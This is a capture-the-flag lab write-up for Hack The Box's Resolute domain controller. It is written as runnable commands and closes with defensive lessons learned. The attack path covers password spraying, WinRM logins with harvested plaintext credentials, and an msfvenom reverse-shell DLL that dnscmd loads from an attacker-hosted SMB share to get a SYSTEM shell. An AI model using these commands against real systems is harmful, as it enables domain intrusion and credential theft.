---
title: "Hack The Box - Resolute - Writeup"
description: "Active Directory enumeration, password spraying, WinRM access, PowerShell transcript credential discovery, and DnsAdmins privilege escalation on Hack The Box Resolute."

image: "/images/resolute.png"
draft: false
difficulty: Medium
platform: HackTheBox

tags:
  - HackTheBox
  - Windows
  - Active Directory
  - Password Spraying
  - WinRM
  - DnsAdmins
  - PowerShell
  - Privilege Escalation

categories:
  - HTB

ShowToc: true
TocOpen: true
ShowReadingTime: false
ShowBreadCrumbs: false
---

# Overview

Resolute is a beginner-friendly Active Directory machine focused on RPC enumeration, password spraying, credential discovery, WinRM access, and DnsAdmins privilege escalation.

The machine demonstrates how weak operational security and dangerous delegated privileges can eventually lead to full SYSTEM compromise on a Domain Controller.

---

# Skills & Concepts

* Active Directory Enumeration
* RPC Enumeration
* Password Spraying
* WinRM Access
* PowerShell Transcript Analysis
* Credential Harvesting
* DnsAdmins Abuse
* DLL Injection
* Active Directory Privilege Escalation

---

# Tools Used

* Nmap
* rpcclient
* enum4linux
* CrackMapExec
* Evil-WinRM
* msfvenom
* Impacket SMB Server
* dnscmd
* Netcat

---

# Enumeration

## Nmap Scan

Initial service enumeration:

```bash
nmap -sC -sV -oA nmap/initial 10.10.10.169
```

Results:

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
3268/tcp  open  ldap
```

The exposed services strongly suggested that the target was functioning as a Domain Controller.

Important observations:

* LDAP exposed
* Kerberos enabled
* SMB accessible
* WinRM available

---

# RPC Enumeration

Anonymous RPC enumeration was permitted on the target.

Using `rpcclient`:

```bash
rpcclient -U "" -N 10.10.10.169
```

Inside `rpcclient`:

```bash
enumdomusers
```

This revealed multiple valid domain usernames.

Alternative enumeration could also be performed using:

```bash
enum4linux 10.10.10.169
```

---

# Credential Discovery

During RPC enumeration, a password was discovered inside a user's description field.

Example:

```text
Password: Welcome123!
```

This simulated a common enterprise mistake involving:

* temporary onboarding passwords
* helpdesk notes
* insecure credential management

---

# Password Spraying

After collecting valid usernames, password spraying was performed using CrackMapExec.

```bash
crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!'
```

Successful credentials:

```text
MEGABANK\melanie:Welcome123!
```

---

# WinRM Access

Using Evil-WinRM:

```bash
evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
```

Successful authentication granted PowerShell access to the target system.

---

# User Flag

Navigating to the user's desktop:

```powershell
cd C:\Users\melanie\Desktop
type user.txt
```

---

# Local Enumeration

Searching the file system for interesting files:

```powershell
Get-ChildItem -Path C:\ -Include *.txt,*.log -File -Recurse -ErrorAction SilentlyContinue
```

PowerShell transcript logs were discovered during enumeration.

Interesting directories included:

```text
C:\PSTranscripts
```

---

# Credential Harvesting

Inside the transcript logs, another set of credentials was discovered:

```text
net use \\server /user:MEGABANK\ryan Serv3r4Admin4cc123!
```

Recovered credentials:

```text
ryan:Serv3r4Admin4cc123!
```

---

# Lateral Movement

Authenticating as `ryan`:

```bash
evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
```

Successful authentication provided access to a more privileged user account.

---

# Privilege Escalation

## Group Enumeration

Checking group memberships:

```powershell
whoami /groups
```

Interesting group membership discovered:

```text
DnsAdmins
```

Members of the `DnsAdmins` group can configure the DNS service to load arbitrary DLLs, allowing SYSTEM-level code execution.

---

# Malicious DLL Generation

Generating a malicious DLL using `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=YOUR_IP \
LPORT=4444 \
-f dll \
-o evil.dll
```

---

# SMB Share Hosting

The malicious DLL was hosted using Impacket SMB Server:

```bash
impacket-smbserver share ./
```

---

# DNS Plugin Abuse

Configuring the DNS service to load the malicious DLL from the SMB share:

```powershell
dnscmd localhost /config /serverlevelplugindll \\YOUR_IP\share\evil.dll
```

Expected output:

```text
Registry property serverlevelplugindll reset
Command completed successfully.
```

---

# Triggering SYSTEM Execution

Starting a listener:

```bash
nc -lvnp 4444
```

Restarting the DNS service:

```powershell
sc.exe stop dns
sc.exe start dns
```

Once the DNS service loaded the malicious DLL, a SYSTEM shell was obtained.

---

# Root Flag

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

---

# Attack Path Summary

```text
RPC Enumeration
        ↓
User Enumeration
        ↓
Password Discovery
        ↓
Password Spraying
        ↓
WinRM Access as melanie
        ↓
PowerShell Transcript Discovery
        ↓
Credential Harvesting
        ↓
WinRM Access as ryan
        ↓
DnsAdmins Abuse
        ↓
DLL Injection
        ↓
SYSTEM Shell
```

---

# Lessons Learned

Resolute is an excellent beginner Active Directory machine because it introduces several important concepts:

* RPC enumeration
* password spraying
* PowerShell transcript credential discovery
* WinRM abuse
* delegated privilege escalation
* DnsAdmins exploitation

while remaining approachable for newcomers to Windows domain exploitation.

The machine also reinforces the importance of:

* secure credential management
* auditing privileged groups
* restricting administrative capabilities
* monitoring PowerShell activity inside enterprise environments

---
